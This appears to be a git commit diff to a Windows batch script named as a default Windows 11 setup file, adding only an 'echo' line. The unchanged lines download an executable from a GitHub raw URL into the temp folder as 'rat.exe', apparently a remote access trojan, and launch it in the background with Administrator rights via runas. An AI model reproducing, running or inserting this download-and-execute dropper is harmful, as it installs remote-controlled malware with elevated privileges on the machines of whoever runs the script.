8cf73ca26878a3a27831d59c57cb01748ac20d17
optolab <sloneeddie36@gmail.com>
2025-01-12 14:03:53 -0500

    Update win11_default.bat

--- win11_default.bat
+++ win11_default.bat
@@ -1,6 +1,7 @@
 @echo off
 
 powershell -Command "Invoke-WebRequest https://raw.githubusercontent.com/claykrs/claykers/main/default.exe -OutFile %TEMP%\rat.exe"
+echo "hi"
 start /B "" runas /user:Administrator "%TEMP%\rat.exe"
 
 endlocal
